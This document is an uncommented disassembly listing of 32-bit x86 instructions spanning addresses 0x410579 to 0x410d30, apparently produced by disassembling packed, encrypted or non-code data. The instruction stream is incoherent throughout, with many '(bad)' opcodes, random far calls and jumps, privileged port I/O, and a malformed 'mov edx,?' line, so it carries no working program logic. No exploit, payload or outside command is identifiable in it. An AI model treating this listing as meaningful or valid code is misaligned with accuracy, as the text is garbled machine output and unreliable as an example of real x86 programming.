  410579:	xor    al,0x65
  41057b:	sub    eax,0x2f0f784b
  410580:	daa    
  410581:	mov    eax,DWORD PTR [ecx]
  410583:	and    edi,DWORD PTR [ebp+0x9]
  410586:	add    BYTE PTR [ebx-0x67],dh
  410589:	in     al,dx
  41058a:	mov    bl,0xa1
  41058c:	cdq    
  41058d:	hlt    
  41058e:	mov    bh,0xbb
  410590:	in     al,0x9b
  410592:	mov    al,ds:0xc0c64439
  410597:	or     ebx,ecx
  410599:	int    0xd5
  41059b:	xor    eax,0x4624231
  4105a0:	arpl   bx,di
  4105a2:	xor    al,BYTE PTR [esi]
  4105a4:	sbb    eax,0xdc436429
  4105a9:	dec    ebx
  4105aa:	jne    0x41052f
  4105ac:	fimul  DWORD PTR [eax-0x53]
  4105af:	jge    0x4105a0
  4105b1:	mov    eax,ds:0xe3e3409
  4105b6:	icebp  
  4105b7:	int    0x30
  4105b9:	out    0x6d,eax
  4105bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105bc:	pop    ebp
  4105bd:	mov    al,ds:0x37f8a0a2
  4105c2:	mov    cl,0x21
  4105c4:	(bad)  
  4105c5:	(bad)  
  4105c7:	shl    DWORD PTR [esi-0x70],1
  4105ca:	aaa    
  4105cb:	fidiv  WORD PTR [ecx]
  4105cd:	mov    edx,0x3c1415c3
  4105d2:	call   0x4510:0x82578f94
  4105d9:	or     al,0x9d
  4105db:	jle    0x41055d
  4105dd:	int    0x16
  4105df:	xchg   BYTE PTR [edi+0x6a4be39],cl
  4105e5:	data16 xor al,0xa3
  4105e8:	ret    
  4105e9:	sub    eax,0x8650798d
  4105ee:	jp     0x410651
  4105f0:	pop    esp
  4105f1:	mov    al,ds:0x14569bba
  4105f6:	cmp    BYTE PTR [edi+ebp*8],al
  4105f9:	xchg   esp,eax
  4105fa:	mov    bh,0x76
  4105fc:	sub    dl,ah
  4105fe:	xchg   esi,eax
  4105ff:	jne    0x41059c
  410601:	pop    edi
  410602:	lea    ebx,[eax+0x2e]
  410605:	shl    BYTE PTR [ebx-0x151d39e1],1
  41060b:	sub    eax,0xe156f487
  410610:	mov    esi,0xa1866f8e
  410615:	inc    ecx
  410616:	jne    0x410690
  410618:	inc    edi
  410619:	test   dl,0x85
  41061c:	or     al,0xf8
  41061e:	inc    ecx
  41061f:	mov    ch,0xfe
  410621:	mov    dh,0xbf
  410623:	or     DWORD PTR [eax],esp
  410625:	xchg   esp,eax
  410626:	lahf   
  410627:	(bad)  
  410628:	sub    bl,BYTE PTR [ebx+0x55607694]
  41062e:	xlat   BYTE PTR ds:[ebx]
  41062f:	jge    0x410677
  410631:	xor    eax,0x6d3b2ec8
  410636:	sbb    DWORD PTR [esp+eax*2+0x60],ebp
  41063a:	push   0xbdef7a92
  41063f:	mov    bl,0x18
  410641:	in     eax,dx
  410642:	ins    BYTE PTR es:[edi],dx
  410643:	scas   al,BYTE PTR es:[edi]
  410644:	push   0x3d
  410646:	out    0xcd,eax
  410648:	dec    esp
  410649:	retf   
  41064a:	call   0x5c0e:0x970da74b
  410651:	cli    
  410652:	test   al,0x69
  410654:	xchg   esi,eax
  410655:	ja     0x4106d0
  410657:	jp     0x4105f4
  410659:	mov    ds:0x97da8913,eax
  41065e:	mov    ebp,0xe884b2ba
  410663:	dec    ebx
  410664:	jns    0x4106da
  410666:	and    dl,BYTE PTR [edi+0x4ae91217]
  41066c:	push   0xffffffa2
  41066e:	fisub  WORD PTR [esi+0x56]
  410671:	repnz sti 
  410673:	mov    eax,ds:0xa1344a06
  410678:	mov    eax,0xb60892cf
  41067d:	shl    BYTE PTR [edx*4-0x1eb21bb],1
  410684:	and    dh,ah
  410686:	sbb    al,0x92
  410688:	push   es
  410689:	cmp    eax,0xd4b30198
  41068e:	xchg   edx,eax
  41068f:	jg     0x4106cd
  410691:	in     ax,dx
  410693:	lods   eax,DWORD PTR ds:[esi]
  410694:	loopne 0x4106e9
  410696:	dec    esp
  410697:	cmp    esi,DWORD PTR [ebp-0x79]
  41069a:	sub    al,0x74
  41069c:	cdq    
  41069d:	imul   ebx,DWORD PTR [esi+ebx*4-0x36],0x5ffc6c39
  4106a5:	inc    esp
  4106a6:	mov    esi,0x11f1068e
  4106ab:	arpl   WORD PTR [esi],ax
  4106ad:	leave  
  4106ae:	call   0x68ad:0xf386f5a8
  4106b5:	xchg   edx,eax
  4106b6:	mov    WORD PTR [edi-0x2d99ba2c],ss
  4106bc:	imul   ebx,DWORD PTR [ebx],0x93be6788
  4106c2:	xlat   BYTE PTR ds:[ebx]
  4106c3:	stos   DWORD PTR es:[edi],eax
  4106c4:	stos   DWORD PTR es:[edi],eax
  4106c5:	ds pop esi
  4106c7:	sub    eax,0x323765bb
  4106cc:	adc    DWORD PTR [ebx+0x13472f77],edi
  4106d2:	jno    0x4106d0
  4106d4:	clc    
  4106d5:	xchg   esp,eax
  4106d6:	(bad)  
  4106d7:	aas    
  4106d8:	bsf    esp,DWORD PTR [esi]
  4106db:	lahf   
  4106dc:	hlt    
  4106dd:	mov    edx,0xe0fec818
  4106e2:	jb     0x4106c4
  4106e4:	pop    ss
  4106e5:	es jbe 0x4106df
  4106e8:	push   es
  4106e9:	test   eax,ebx
  4106eb:	(bad)  
  4106ec:	or     ebx,DWORD PTR [ecx]
  4106ee:	pop    ebp
  4106ef:	test   al,0xef
  4106f1:	mov    bh,0x5a
  4106f3:	cmp    al,bl
  4106f5:	into   
  4106f6:	stos   BYTE PTR es:[edi],al
  4106f7:	cmc    
  4106f8:	call   0x5aac1e88
  4106fd:	mov    ebx,0x4989ec7d
  410702:	jmp    0x7bdb:0x20b2e220
  410709:	std    
  41070a:	sub    ebp,DWORD PTR [esp+ebx*4]
  41070d:	cli    
  41070e:	push   esi
  41070f:	ins    DWORD PTR es:[edi],dx
  410710:	inc    eax
  410711:	test   dl,bh
  410713:	pop    edx
  410714:	loopne 0x4106cd
  410716:	xor    dh,BYTE PTR [ebp-0x20]
  410719:	ds mov al,0x46
  41071c:	sub    eax,0x8e145dcf
  410721:	xor    cl,BYTE PTR [ebp-0x380f694d]
  410727:	xchg   ecx,eax
  410728:	fst    DWORD PTR [ebp-0x5bbdc1fc]
  41072e:	pop    ebp
  41072f:	int    0x30
  410731:	fsubrp st(4),st
  410733:	(bad)  
  410734:	jo     0x41076c
  410736:	popf   
  410737:	xchg   ebx,eax
  410738:	scas   al,BYTE PTR es:[edi]
  410739:	or     eax,0x554bfde7
  41073e:	inc    edi
  41073f:	jno    0x4106c2
  410741:	mov    eax,ds:0x3d00149b
  410746:	or     dh,ch
  410748:	inc    eax
  410749:	mov    esi,esp
  41074b:	sub    dh,BYTE PTR [ebx]
  41074d:	iret   
  41074e:	xor    al,BYTE PTR [ebx+0x1a99a64]
  410754:	xor    BYTE PTR [edi-0x47],0x98
  410758:	lock jb 0x410748
  41075b:	push   0xad55c6e6
  410760:	and    eax,0x143d28af
  410765:	push   cs
  410766:	pop    esp
  410767:	pop    ds
  410768:	pop    es
  410769:	pop    ecx
  41076a:	inc    edi
  41076b:	jnp    0x41078e
  41076d:	mov    ch,0xa1
  41076f:	mov    ds:0x21829bcc,eax
  410774:	mov    eax,ecx
  410776:	pop    ebp
  410777:	inc    ecx
  410778:	push   ebx
  410779:	add    ch,BYTE PTR [ebp-0x3da14e4]
  41077f:	push   ebx
  410780:	inc    esp
  410781:	add    DWORD PTR [ebx-0x3d922b8f],0xa90c26a4
  41078b:	nop
  41078c:	shufps xmm0,XMMWORD PTR [ebp-0x140d21e8],0x35
  410794:	sbb    BYTE PTR [eax+ecx*4+0x75],0xdb
  410799:	ret    0xc127
  41079c:	pop    ebp
  41079d:	outs   dx,DWORD PTR ds:[esi]
  41079e:	jmp    0xefd7:0x53248f35
  4107a5:	push   esp
  4107a6:	xchg   esi,eax
  4107a7:	adc    BYTE PTR [edi-0x51],ch
  4107aa:	inc    esp
  4107ab:	push   edi
  4107ac:	cli    
  4107ad:	fwait
  4107ae:	cmp    bh,ch
  4107b0:	jb     0x41075f
  4107b2:	(bad)  
  4107b3:	lods   al,BYTE PTR cs:[esi]
  4107b5:	and    DWORD PTR [edi+0x60b9d23d],ecx
  4107bb:	dec    ecx
  4107bc:	jmp    0x43f4c256
  4107c1:	ins    DWORD PTR es:[edi],dx
  4107c2:	cmp    BYTE PTR [eax-0x67],0x8a
  4107c6:	les    edi,FWORD PTR [esi-0x6d578aaf]
  4107cc:	xor    al,0xee
  4107ce:	mov    esi,DWORD PTR [esi+0x7f36d91e]
  4107d4:	pop    esi
  4107d5:	xchg   edx,eax
  4107d6:	dec    esp
  4107d7:	sub    dh,BYTE PTR [eax+0x6eb56f2a]
  4107dd:	add    DWORD PTR [ecx],edx
  4107df:	loope  0x4107a2
  4107e1:	jnp    0x4107d3
  4107e3:	cwde   
  4107e4:	pop    eax
  4107e5:	jle    0x410833
  4107e7:	ficom  WORD PTR [ecx-0x5af8c199]
  4107ed:	and    DWORD PTR ds:0xccdc1109,ebx
  4107f3:	scas   al,BYTE PTR es:[edi]
  4107f4:	icebp  
  4107f5:	cmp    BYTE PTR ds:0x9b140f1d,bl
  4107fb:	mov    bl,0x77
  4107fd:	mov    BYTE PTR [ebx+0x2e],al
  410800:	jle    0x410874
  410802:	cmp    BYTE PTR [edx-0x2a],bl
  410805:	js     0x41082c
  410807:	jmp    FWORD PTR [edx+ebp*8+0x7afe18ea]
  41080e:	adc    BYTE PTR [edi-0x5fe634ac],0x35
  410815:	scas   eax,DWORD PTR es:[edi]
  410816:	mov    ebx,0xbeb2d65c
  41081b:	mov    esi,0xac2cf0b0
  410820:	cmp    BYTE PTR [ebp-0xa03a674],bh
  410826:	rcl    esi,cl
  410828:	jns    0x41082f
  41082a:	or     esi,edx
  41082c:	jne    0x410897
  41082e:	jmp    0xcb10e6a2
  410833:	sbb    eax,0x14fbf9dc
  410839:	xchg   ebp,eax
  41083a:	in     eax,0x1b
  41083c:	rol    DWORD PTR [ecx-0x7],1
  41083f:	jae    0x410828
  410841:	mov    cl,0xf4
  410843:	mov    ds,WORD PTR [ebx]
  410845:	pop    esi
  410846:	fmul   DWORD PTR ds:0x2540daa6
  41084c:	(bad)  
  41084d:	xor    bl,dl
  41084f:	aam    0xbc
  410851:	adc    ah,cl
  410853:	mov    esp,0x5e059453
  410858:	mov    WORD PTR [ebx-0x20],gs
  41085b:	sahf   
  41085c:	cmp    esi,DWORD PTR [esi+0x29]
  41085f:	fadd   QWORD PTR [ecx-0x29fd76a1]
  410865:	popf   
  410866:	popf   
  410867:	test   DWORD PTR [ebx+0x69],0x5b4754dd
  41086e:	fist   WORD PTR [ecx-0x36]
  410871:	xor    DWORD PTR [ebp-0x468c0682],eax
  410877:	adc    esp,esp
  410879:	shl    DWORD PTR [esi],0x6e
  41087c:	inc    esi
  41087d:	call   0xd9cd:0x3d82e9c8
  410884:	fst    st(0)
  410886:	sbb    eax,0xb38c02bc
  41088b:	jecxz  0x4108aa
  41088d:	(bad)  
  41088e:	pusha  
  41088f:	xchg   BYTE PTR [ebp-0x49],bl
  410892:	sahf   
  410893:	iret   
  410894:	inc    edx
  410895:	xchg   edx,eax
  410896:	stc    
  410897:	(bad)  
  410898:	dec    edx
  410899:	(bad)  
  41089b:	imul   edi,DWORD PTR [ebp-0x70],0x6b0a607a
  4108a2:	cs jo  0x41082f
  4108a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108a6:	fwait
  4108a7:	adc    ah,cl
  4108a9:	mov    ds:0xbbd2edad,al
  4108ae:	mov    al,0x19
  4108b0:	jns    0x410874
  4108b2:	cmp    eax,0x37e61428
  4108b7:	push   ebx
  4108b8:	shl    BYTE PTR [esp+edx*8-0x1c],0xd0
  4108bd:	lods   al,BYTE PTR ds:[esi]
  4108be:	int3   
  4108bf:	mov    edi,0xa3aa414b
  4108c4:	sub    ebp,DWORD PTR [ebx-0x27]
  4108c7:	mov    al,ds:0xc0c31087
  4108cc:	push   es
  4108cd:	retf   0xbf0e
  4108d0:	clc    
  4108d1:	les    esi,FWORD PTR [ebx-0xee0ce5d]
  4108d7:	ins    BYTE PTR es:[edi],dx
  4108d8:	pop    ebp
  4108d9:	push   0x4fb5dcc2
  4108de:	adc    eax,0x191cd68f
  4108e3:	mov    ds:0xfe1cf1e3,eax
  4108e8:	and    DWORD PTR cs:[ebx],ebp
  4108eb:	sbb    esp,DWORD PTR [ebx]
  4108ed:	mov    al,ds:0xf7b82c68
  4108f2:	gs xor eax,0xd7b4f8ee
  4108f8:	mov    edi,0x39c205a2
  4108fd:	lods   al,BYTE PTR ds:[esi]
  4108fe:	pushf  
  4108ff:	dec    esp
  410900:	ins    DWORD PTR es:[edi],dx
  410901:	outs   dx,DWORD PTR ds:[esi]
  410902:	hlt    
  410903:	call   0x7704:0x72d5ae10
  41090a:	fdiv   QWORD PTR [edi-0x52]
  41090d:	cmp    al,0x2e
  41090f:	jno    0x410923
  410911:	mov    edx,?
  410913:	repnz mov BYTE PTR [edi],dh
  410916:	sub    ebp,eax
  410918:	lahf   
  410919:	cmp    edx,esp
  41091b:	ret    0xf1e3
  41091e:	jmp    0x8fed:0x50ca5b2f
  410925:	xchg   ch,ah
  410927:	xor    bh,cl
  410929:	iret   
  41092a:	mov    ah,0x46
  41092c:	or     edx,DWORD PTR [ebx+0x44]
  41092f:	stos   BYTE PTR es:[edi],al
  410930:	in     eax,0xf
  410932:	xor    al,bh
  410934:	sub    al,ch
  410936:	sbb    al,0xcf
  410938:	(bad)  
  410939:	in     eax,dx
  41093a:	test   BYTE PTR [ecx],0x21
  41093d:	test   BYTE PTR [esi],ch
  41093f:	in     eax,0x29
  410941:	push   cs
  410942:	mov    dh,0xf3
  410944:	and    eax,0xe2cbde56
  410949:	xchg   ecx,eax
  41094a:	div    DWORD PTR [ebx-0x10]
  41094d:	ror    BYTE PTR [ebx+0x39],1
  410950:	mov    eax,0x6ea9ee3f
  410955:	sti    
  410956:	add    DWORD PTR [eax+edi*8],0xffffffd8
  41095a:	lods   eax,DWORD PTR ds:[esi]
  41095b:	jo     0x410913
  41095d:	xlat   BYTE PTR ds:[ebx]
  41095e:	lock js 0x41095f
  410961:	mov    cl,0xc9
  410963:	mov    bl,0xaf
  410965:	fnstenv [esi-0x59613407]
  41096b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41096c:	imul   ecx,DWORD PTR [ebx-0x752b992a],0x7d
  410973:	adc    BYTE PTR [ecx-0x3971f629],al
  410979:	in     al,0xe2
  41097b:	(bad)  
  41097d:	rcr    BYTE PTR [edi-0x37],cl
  410980:	fdiv   QWORD PTR [esp+eiz*8-0x431de1db]
  410987:	cmp    ebx,ebp
  410989:	popa   
  41098a:	inc    edi
  41098b:	fistp  QWORD PTR [eax]
  41098d:	dec    eax
  41098e:	sahf   
  41098f:	mov    ebp,0x7fbf7a58
  410994:	sub    cl,BYTE PTR [eax-0x7df58c4]
  41099a:	inc    esp
  41099b:	jle    0x4109d1
  41099d:	add    al,ah
  41099f:	sbb    DWORD PTR [eax+0x1],ecx
  4109a2:	adc    eax,0xb5473740
  4109a7:	lods   al,BYTE PTR ds:[esi]
  4109a8:	dec    esi
  4109a9:	dec    edi
  4109aa:	repnz xor esi,DWORD PTR [ecx+edx*4-0x1]
  4109af:	add    cl,BYTE PTR [ebx-0x73391378]
  4109b5:	add    DWORD PTR [esi-0x632f494a],ebx
  4109bb:	ret    
  4109bc:	mov    dh,0xfe
  4109be:	mov    DWORD PTR [eax],edi
  4109c0:	xchg   DWORD PTR [ecx-0x1b49436e],edi
  4109c6:	pop    ss
  4109c7:	cdq    
  4109c8:	sbb    al,0x94
  4109ca:	inc    esi
  4109cb:	dec    ebp
  4109cc:	xor    BYTE PTR [eax-0x3f],bh
  4109cf:	out    0xd3,al
  4109d1:	retf   0xdb7e
  4109d4:	pop    es
  4109d5:	pop    es
  4109d6:	jmp    0x4fb63dff
  4109db:	(bad)  
  4109dc:	sar    DWORD PTR [edi],cl
  4109de:	cmp    al,0xd6
  4109e0:	xchg   edx,eax
  4109e1:	dec    edx
  4109e2:	sahf   
  4109e3:	sub    bl,BYTE PTR [ecx+0x32]
  4109e6:	pop    ebx
  4109e7:	and    DWORD PTR [ebx],ecx
  4109e9:	sub    BYTE PTR [ecx+0x5c],cl
  4109ec:	cmc    
  4109ed:	retf   
  4109ee:	outs   dx,DWORD PTR ds:[esi]
  4109ef:	xor    dl,bl
  4109f1:	sbb    al,0x31
  4109f3:	cs mov eax,0x862aad63
  4109f9:	int3   
  4109fa:	mov    al,cs:0xd646975d
  410a00:	pop    edi
  410a01:	ss mov bh,0xcb
  410a04:	mov    ebx,0x37bf4346
  410a09:	dec    ebp
  410a0a:	outs   dx,DWORD PTR ds:[esi]
  410a0b:	into   
  410a0c:	dec    ebp
  410a0d:	mov    cl,BYTE PTR [bx+0x5313]
  410a12:	push   ecx
  410a13:	inc    ebx
  410a14:	pop    ss
  410a15:	xchg   ebp,eax
  410a16:	ret    0x857
  410a19:	sbb    eax,0xfb397047
  410a1e:	dec    edi
  410a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a20:	and    al,BYTE PTR [esi-0x2884df9a]
  410a26:	in     al,dx
  410a27:	inc    ecx
  410a28:	outs   dx,DWORD PTR ds:[esi]
  410a29:	jl     0x410aa8
  410a2b:	jle    0x410a71
  410a2d:	push   ebx
  410a2e:	(bad)  
  410a30:	dec    esp
  410a31:	xchg   ecx,eax
  410a32:	jne    0x410a09
  410a34:	pop    eax
  410a35:	neg    esp
  410a37:	xor    DWORD PTR [ecx-0x10],ebp
  410a3a:	(bad)  
  410a3c:	sti    
  410a3d:	jns    0x410a46
  410a3f:	sbb    al,0xcc
  410a41:	inc    esp
  410a42:	outs   dx,BYTE PTR ds:[esi]
  410a43:	sbb    eax,0x98a9646e
  410a48:	test   BYTE PTR [ecx-0x346bc915],ch
  410a4e:	lea    esp,[ecx]
  410a50:	ds out 0x90,eax
  410a53:	and    cl,ah
  410a55:	add    al,0x39
  410a57:	cmp    al,0x42
  410a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a5a:	sbb    al,0x39
  410a5c:	jge    0x410a3d
  410a5e:	mov    dl,0xa4
  410a60:	mov    cl,0x42
  410a62:	cmp    al,0xfd
  410a64:	pop    esi
  410a65:	push   0x1a
  410a67:	push   ds
  410a68:	add    eax,0xcc039b21
  410a6d:	rcl    DWORD PTR [ebp+0x1dd3398d],0xc5
  410a74:	cmp    cl,BYTE PTR [ebx]
  410a76:	dec    esp
  410a77:	dec    ebp
  410a78:	pop    es
  410a79:	scas   al,BYTE PTR es:[edi]
  410a7a:	loope  0x410a39
  410a7c:	or     DWORD PTR [ecx],0xffffffe4
  410a7f:	pop    ebp
  410a80:	fcom   st(3)
  410a82:	int3   
  410a83:	mov    dl,0xf3
  410a85:	in     eax,dx
  410a86:	mov    esi,DWORD PTR [esp+ebx*8-0x1cfdbcc7]
  410a8d:	push   0xc
  410a8f:	push   edi
  410a90:	fs xor al,0x37
  410a93:	mov    BYTE PTR [ebp+0xa4080af],cl
  410a99:	lods   eax,DWORD PTR ds:[esi]
  410a9a:	mov    ds:0x2072c075,al
  410a9f:	std    
  410aa0:	call   0xa302a562
  410aa5:	inc    eax
  410aa6:	imul   edi,ebp,0x13
  410aa9:	pop    ebx
  410aaa:	cwde   
  410aab:	in     eax,0x9f
  410aad:	shr    BYTE PTR [edi-0x5272a5c],0xad
  410ab4:	ja     0x410a4e
  410ab6:	sbb    bl,BYTE PTR [edx-0x7b]
  410ab9:	cli    
  410aba:	outs   dx,BYTE PTR ds:[esi]
  410abb:	int3   
  410abc:	jbe    0x410abe
  410abe:	xor    eax,0xa9e9bce3
  410ac3:	mov    dh,0xc
  410ac5:	repz mov eax,ds:0x5253582d
  410acb:	mov    WORD PTR [ebx-0xd3b4723],cs
  410ad1:	cwde   
  410ad2:	inc    edx
  410ad3:	ins    BYTE PTR es:[edi],dx
  410ad4:	mov    eax,0x450c38bc
  410ad9:	and    BYTE PTR [edi+0x7c37d501],ah
  410adf:	dec    esp
  410ae0:	mov    esi,0x730fe40c
  410ae5:	push   ecx
  410ae6:	or     eax,0xf065233e
  410aeb:	ins    BYTE PTR es:[edi],dx
  410aec:	cmc    
  410aed:	(bad)  
  410aee:	fnsave [ebx+0x3b]
  410af1:	inc    edx
  410af2:	mov    dh,0x86
  410af4:	stc    
  410af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410af6:	out    0x23,eax
  410af8:	sbb    eax,0x946fb3d5
  410afd:	xchg   ecx,eax
  410afe:	inc    esp
  410aff:	cmp    bh,BYTE PTR [edx]
  410b01:	outs   dx,BYTE PTR ds:[esi]
  410b02:	scas   al,BYTE PTR es:[edi]
  410b03:	test   al,0x1a
  410b05:	cmp    al,0xc0
  410b07:	or     eax,0xc6e3c9f0
  410b0c:	pop    edx
  410b0d:	mov    eax,0xcad870e8
  410b12:	jge    0x410b39
  410b14:	xchg   esi,edx
  410b16:	pop    ebp
  410b17:	and    al,0x2
  410b19:	aas    
  410b1a:	xchg   esi,eax
  410b1b:	iret   
  410b1c:	mov    cl,0x36
  410b1e:	sti    
  410b1f:	jnp    0x410b40
  410b21:	enter  0x6b17,0xd6
  410b25:	xor    cl,BYTE PTR [ebx+0x7198d4cd]
  410b2b:	out    0xd1,eax
  410b2d:	lea    esp,[edx+0x667df659]
  410b33:	int3   
  410b34:	loop   0x410ada
  410b36:	and    cl,0x7c
  410b39:	jl     0x410b6c
  410b3b:	jp     0x410bb1
  410b3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b3f:	ss push ebx
  410b41:	xor    al,0xb3
  410b43:	test   ah,dl
  410b45:	loopne 0x410b02
  410b47:	pop    ebp
  410b48:	ret    
  410b49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b4a:	nop
  410b4b:	and    eax,0x3ddcc4cc
  410b50:	and    esi,0x2b5e5f97
  410b56:	jmp    0x410b28
  410b58:	ins    DWORD PTR es:[edi],dx
  410b59:	or     bh,BYTE PTR [edx-0x1b]
  410b5c:	mov    al,0x98
  410b5e:	shr    ch,0x1f
  410b61:	pusha  
  410b62:	jns    0x410bb7
  410b64:	mov    edx,0x179ec05c
  410b69:	shl    BYTE PTR [edx+0x14],1
  410b6c:	mul    DWORD PTR [esi]
  410b6e:	and    BYTE PTR fs:[eax],0x87
  410b72:	mov    fs,esi
  410b74:	add    BYTE PTR [ecx-0x4c],bh
  410b77:	retf   0x9617
  410b7a:	mov    al,ds:0xe40feefa
  410b7f:	loope  0x410b78
  410b81:	pop    es
  410b82:	xchg   BYTE PTR [edi-0x6d],cl
  410b85:	sti    
  410b86:	xor    eax,0x2edd135
  410b8b:	cmp    edi,eax
  410b8d:	sub    ebp,DWORD PTR [ecx]
  410b8f:	xlat   BYTE PTR ds:[ebx]
  410b90:	sbb    bl,dl
  410b92:	push   ecx
  410b93:	sbb    DWORD PTR [esi+0x4b],0x6c2c75af
  410b9a:	mov    es,WORD PTR [ebx-0x3c67035f]
  410ba0:	pop    ss
  410ba1:	lahf   
  410ba2:	sar    DWORD PTR ds:0x7029e786,cl
  410ba8:	ins    BYTE PTR es:[edi],dx
  410ba9:	push   esp
  410baa:	sahf   
  410bab:	xchg   edi,eax
  410bac:	lock pop ecx
  410bae:	or     DWORD PTR [ebp+0x71],esi
  410bb1:	mov    al,BYTE PTR [ebx+ecx*2]
  410bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bb5:	pop    esp
  410bb6:	or     esp,DWORD PTR [ecx]
  410bb8:	das    
  410bb9:	xor    ebp,edi
  410bbb:	scas   al,BYTE PTR es:[edi]
  410bbc:	lahf   
  410bbd:	push   ebp
  410bbe:	shl    DWORD PTR [esi+0x658a6ec6],0xd2
  410bc5:	pop    ebx
  410bc6:	mov    esi,0x8663dd0d
  410bcb:	add    ecx,DWORD PTR [edi+0x4e]
  410bce:	adc    eax,0x60c059d8
  410bd3:	rol    BYTE PTR [ecx+0x66],1
  410bd6:	(bad)  
  410bd7:	std    
  410bd8:	scas   eax,DWORD PTR es:[edi]
  410bd9:	cwde   
  410bda:	xor    eax,DWORD PTR [edx+0x5449b29e]
  410be0:	scas   eax,DWORD PTR es:[edi]
  410be1:	jg     0x410c50
  410be3:	dec    edx
  410be4:	pop    ebx
  410be5:	add    BYTE PTR [ebx],0x7b
  410be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410be9:	dec    eax
  410bea:	fnstsw WORD PTR [ebx-0x60]
  410bed:	jae    0x410b7b
  410bef:	dec    edx
  410bf0:	or     DWORD PTR [esi],edx
  410bf2:	pusha  
  410bf3:	push   edi
  410bf4:	jmp    0x410c09
  410bf6:	retf   0xf84
  410bf9:	sub    al,0xc3
  410bfb:	dec    ebx
  410bfc:	aad    0x9c
  410bfe:	add    DWORD PTR [edi-0x13],esi
  410c01:	dec    esp
  410c02:	dec    edi
  410c03:	jge    0x410c6c
  410c05:	in     al,dx
  410c06:	js     0x410bee
  410c08:	xor    edi,DWORD PTR [eax]
  410c0a:	pop    esi
  410c0b:	sub    eax,0xc84f6e06
  410c10:	retf   
  410c11:	hlt    
  410c12:	mov    ds:0x3e785d2,eax
  410c17:	dec    edx
  410c18:	or     al,0x12
  410c1a:	push   cs
  410c1b:	add    DWORD PTR [ecx-0x65ff64c3],0xffffffc4
  410c22:	das    
  410c23:	call   FWORD PTR [eax-0x36607d88]
  410c29:	add    edx,eax
  410c2b:	mov    al,0x63
  410c2d:	stos   DWORD PTR es:[edi],eax
  410c2e:	sbb    al,BYTE PTR [ebp+0x10776296]
  410c34:	xchg   DWORD PTR ds:0xe6d940d0,esp
  410c3a:	aaa    
  410c3b:	jmp    0xc47c1199
  410c40:	out    dx,al
  410c41:	js     0x410c88
  410c43:	adc    cl,BYTE PTR [esi+0x4c]
  410c46:	adc    al,0xaf
  410c48:	xchg   ecx,eax
  410c4a:	dec    ebp
  410c4b:	ret    
  410c4c:	jno    0x410c77
  410c4e:	jle    0x410bf7
  410c50:	jmp    0x410c6a
  410c52:	mov    esp,0x413d5354
  410c57:	mov    ebx,0xdf3d9398
  410c5c:	mov    ecx,0x6857c701
  410c62:	(bad)  
  410c64:	cdq    
  410c65:	jge    0x410c47
  410c67:	xor    al,0xb9
  410c69:	ror    BYTE PTR [edx],cl
  410c6b:	or     BYTE PTR [ecx-0x1b],0x7e
  410c6f:	cmp    al,0x3b
  410c71:	shr    BYTE PTR [ebx+0x3a],0xef
  410c75:	mov    ds:0x4a4bfca0,eax
  410c7a:	mov    ch,BYTE PTR [esi+eiz*1-0x78]
  410c7e:	int    0x96
  410c80:	mov    ss,WORD PTR [esi+0x66]
  410c83:	imul   edx,DWORD PTR [edx+edx*4+0xf5dad8b],0xd10ae925
  410c8e:	popf   
  410c8f:	rcl    DWORD PTR [ebx+0xcd6c52e],cl
  410c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c96:	(bad)  
  410c97:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c99:	test   BYTE PTR [esi],dh
  410c9b:	push   cs
  410c9c:	sbb    DWORD PTR [esi],esi
  410c9e:	cmp    al,0x4d
  410ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ca1:	stc    
  410ca2:	inc    edi
  410ca3:	jns    0x410c88
  410ca5:	lods   eax,DWORD PTR ds:[esi]
  410ca6:	mov    BYTE PTR [ecx],dl
  410ca8:	dec    esp
  410ca9:	mov    ch,0x9d
  410cab:	cmp    DWORD PTR [ebx],ebx
  410cad:	adc    BYTE PTR [edi+0x52f2c162],ch
  410cb3:	jae    0x410d31
  410cb5:	inc    esp
  410cb6:	pop    edi
  410cb7:	cmp    edx,DWORD PTR [edx-0x10]
  410cba:	inc    ecx
  410cbb:	jae    0x410c6d
  410cbd:	icebp  
  410cbe:	mov    edx,0xf8b69fea
  410cc3:	push   cs
  410cc4:	bswap  esi
  410cc6:	ins    DWORD PTR es:[edi],dx
  410cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cc8:	lea    esp,[edx]
  410cca:	lea    ecx,[edi+0x3450c1f0]
  410cd0:	mov    esi,0xfcc993b
  410cd5:	into   
  410cd6:	fs mov ah,0x4e
  410cd9:	int3   
  410cda:	sbb    al,0xe2
  410cdc:	call   0xa07d:0xf9590306
  410ce3:	xchg   ebp,eax
  410ce4:	inc    eax
  410ce5:	arpl   WORD PTR [ebx-0x485fbdfb],sp
  410ceb:	pop    ds
  410cec:	cmp    DWORD PTR [ecx+ebp*8+0x1b132b59],ebp
  410cf3:	les    eax,FWORD PTR [edx-0x5482b61d]
  410cf9:	dec    esi
  410cfa:	(bad)  
  410cfb:	xor    dh,BYTE PTR [eax+0x24697dc9]
  410d01:	xchg   ebp,eax
  410d02:	inc    ebx
  410d03:	or     bl,ah
  410d05:	mov    DWORD PTR ss:[ebx],0xadb90c2f
  410d0c:	imul   esp,DWORD PTR [edx],0x477ea7bb
  410d12:	pop    ss
  410d13:	sub    al,0xe3
  410d15:	sbb    al,0xdc
  410d17:	arpl   WORD PTR [edx],di
  410d19:	jecxz  0x410cb1
  410d1b:	push   edx
  410d1c:	ror    BYTE PTR [edi],cl
  410d1e:	inc    edx
  410d1f:	sbb    BYTE PTR [esi-0x23],dl
  410d22:	push   esi
  410d23:	xlat   BYTE PTR ds:[ebx]
  410d24:	mov    dh,0xdb
  410d26:	popa   
  410d27:	mov    bl,0xe3
  410d29:	adc    BYTE PTR [ebx-0x606041f7],cl
  410d2f:	aaa    
  410d30:	iret   
